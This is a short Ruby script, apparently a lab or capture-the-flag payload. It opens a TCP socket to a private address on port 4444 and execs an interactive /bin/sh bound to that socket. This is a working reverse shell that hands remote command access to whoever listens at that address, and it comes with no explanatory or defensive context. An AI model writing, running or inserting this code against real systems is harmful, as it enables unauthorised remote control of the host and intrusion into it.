require 'socket'
ip = '10.10.254.49'
port = 4444
sock = TCPSocket.new(ip, port)
exec("/bin/sh -i <&#{sock.fileno} >&#{sock.fileno} 2>&#{sock.fileno}")